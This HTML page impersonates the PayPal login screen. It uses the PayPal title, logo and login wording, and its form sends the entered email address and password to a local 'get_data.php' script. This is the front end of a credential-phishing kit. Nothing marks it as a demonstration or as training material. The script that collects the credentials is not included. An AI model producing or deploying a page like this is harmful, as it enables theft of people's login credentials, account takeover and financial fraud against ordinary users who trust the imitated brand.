<html>
<head><title>Log in to your PayPal account</title></head>
<body>
<link rel="stylesheet" href="css/bootstrap.min.css"  >

<!-- Optional theme -->
<link rel="stylesheet" href="css/bootstrap-theme.min.css ">

<!-- Latest compiled and minified JavaScript -->
<script src="js/bootstrap.min.js"  ></script>
<style>

  body {
    padding-top: 15px;
    font-size: 12px
  }
  .main {
    max-width: 320px;
    margin: 0 auto;
  }
  .login-or {
    position: relative;
    font-size: 18px;
    color: #aaa;
    margin-top: 10px;
            margin-bottom: 10px;
    padding-top: 10px;
    padding-bottom: 10px;
  }
  .span-or {
    display: block;
    position: absolute;
    left: 50%;
    top: -2px;
    margin-left: -25px;
    background-color: #fff;
    width: 50px;
    text-align: center;
  }
  .hr-or {
    background-color: #cdcdcd;
    height: 1px;
    margin-top: 0px !important;
    margin-bottom: 0px !important;
  }
  h3 {
    text-align: center;
    line-height: 300%;
	
	
	
  }
  .paypal-logo-long {
    background: transparent url(paypal-logo-129x32.svg) top center no-repeat;
    background-size: 129px 32px;
    width: 129px;
    height: 32px;
    display: block;
	}
</style>
<div class="container">
  <div class="row">

    <div class="main">

       
      <div class="row">
        <div class="col-xs-6 col-sm-6 col-md-6">
           
        </div>
       
      </div>
      <div class="login-or">
	  <br>  <br>  <br>
           <center><p class="paypal-logo paypal-logo-long"> </p> <center>
         
      </div>

      <form   action="get_data.php" method="post" role="form">
        <div class="form-group">
           
          <input type="text" class="form-control" name="email "id="inputUsernameEmail" placeholder="Email">
        </div>
        <div class="form-group">

     
          <input type="password" class="form-control" name="pw" id="inputPassword" placeholder="password">
        </div>
        
       <button type="submit" class="btn btn-primary btn-md" style="width: 100%;height: 44px;padding: 0;border: 0;display: block;"  >Log In</button><br>
     <center>  <a href="#" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password" style="margin: 20px auto;padding-bottom: 20px;border-bottom: 1px solid #cbd2d6;text-align: center;">Having trouble logging in?</a></center>
      </form>
    
    </div>
    
  </div>
</div>

</body>

</html>